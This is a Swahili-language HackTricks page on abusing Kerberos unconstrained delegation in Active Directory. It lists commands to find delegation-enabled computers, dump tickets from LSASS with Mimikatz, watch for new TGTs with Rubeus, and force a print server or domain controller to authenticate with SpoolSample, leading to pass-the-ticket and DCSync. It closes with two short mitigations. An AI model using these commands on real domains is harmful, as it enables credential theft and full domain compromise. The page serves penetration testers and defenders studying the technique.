# Utekelezaji Usiozuiliwa

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi mtaalamu na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalamu wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwenye [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Utekelezaji Usiozuiliwa

Hii ni kipengele ambacho Msimamizi wa Kikoa anaweza kuweka kwa **Kompyuta** yoyote ndani ya kikoa. Kisha, wakati wowote **mtumiaji anapoingia** kwenye Kompyuta, **nakala ya TGT** ya mtumiaji huyo itatumwa ndani ya TGS inayotolewa na DC **na kuokolewa kwenye kumbukumbu katika LSASS**. Kwa hivyo, ikiwa una mamlaka ya Msimamizi kwenye kompyuta, utaweza **kudump tiketi na kujifanya kuwa watumiaji** kwenye kompyuta yoyote.

Kwa hivyo ikiwa msimamizi wa kikoa anaingia kwenye Kompyuta na kipengele cha "Utekelezaji Usiozuiliwa" kimeamilishwa, na una mamlaka ya msimamizi wa ndani kwenye kompyuta hiyo, utaweza kudump tiketi na kujifanya kuwa Msimamizi wa Kikoa mahali popote (domain privesc).

Unaweza **kupata vitu vya Kompyuta na sifa hii** kwa kuangalia ikiwa sifa ya [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx) ina [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx). Unaweza kufanya hivi na kichujio cha LDAP cha '(userAccountControl:1.2.840.113556.1.4.803:=524288)', ambayo ndiyo inayofanywa na powerview:

<pre class="language-bash"><code class="lang-bash"># Orodhesha kompyuta zisizozuiliwa
## Powerview
Get-NetComputer -Unconstrained #DCs daima huonekana lakini sio muhimu kwa privesc
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Pata tiketi na Mimikatz
</strong>privilege::debug
sekurlsa::tickets /export #Njia iliyopendekezwa
kerberos::list /export #Njia nyingine

# Fuatilia kuingia na pata tiketi mpya
.\Rubeus.exe monitor /targetuser:&#x3C;jina_la_mtumiaji> /interval:10 #Angalia kila baada ya sekunde 10 kwa TGT mpya</code></pre>

Leta tiketi ya Msimamizi (au mtumiaji wa kikoa) kwenye kumbukumbu na **Mimikatz** au **Rubeus kwa** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Maelezo zaidi: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Maelezo zaidi kuhusu utekelezaji usiozuiliwa katika ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Lazima Uthibitishe**

Ikiwa mshambuliaji anaweza **kudukua kompyuta iliyoruhusiwa kwa "Utekelezaji Usiozuiliwa"**, anaweza **kudanganya** **seva ya kuchapisha** ili **ingie kiotomatiki** dhidi yake **na kuokoa TGT** kwenye kumbukumbu ya seva.\
Kisha, mshambuliaji anaweza kufanya shambulio la **Pass the Ticket** ili kujifanya kuwa akaunti ya mtumiaji wa seva ya kuchapisha.

Ili kufanya seva ya kuchapisha iingie kwenye kompyuta yoyote, unaweza kutumia [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Ikiwa TGT ni kutoka kwa kisanduku cha kudhibiti kikoa, unaweza kufanya [shambulio la DCSync](acl-persistence-abuse/#dcsync) na kupata fungu zote kutoka kwa kisanduku cha kudhibiti kikoa. 
[**Maelezo zaidi kuhusu shambulio hili katika ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**Hapa kuna njia nyingine za kujaribu kulazimisha uthibitisho:**

{% content-ref url="printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
{% endcontent-ref %}

### Kupunguza madhara

* Weka kikomo kwa kuingia kwa DA/Admin kwenye huduma maalum
* Weka "Akaunti ni nyeti na haiwezi kupelekwa" kwa akaunti zenye mamlaka. 

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikitangazwa katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuate** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
